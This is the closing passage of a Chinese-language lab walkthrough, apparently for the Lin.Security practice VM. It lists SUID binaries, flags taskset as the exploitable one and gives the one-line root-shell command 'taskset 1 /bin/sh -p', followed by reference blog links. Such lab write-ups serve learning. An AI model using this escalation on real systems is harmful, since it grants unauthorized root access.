/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/netkit-rsh
/usr/bin/taskset                         ->利用点
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/sbin/mount.nfs
```

```bash
taskset 1 /bin/sh -p
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151443.png" alt="image-20240225014914458" style="zoom:50%;" />



## 参考blog

https://www.c0dedead.io/lin-security-1-walkthrough/（很牛的师傅）

https://www.freebuf.com/consult/260506.html

https://blog.csdn.net/qq_34801745/article/details/104055565

https://blog.csdn.net/qq_35782055/article/details/129654291（看了师傅的blog才把网卡配置上去的！！！！）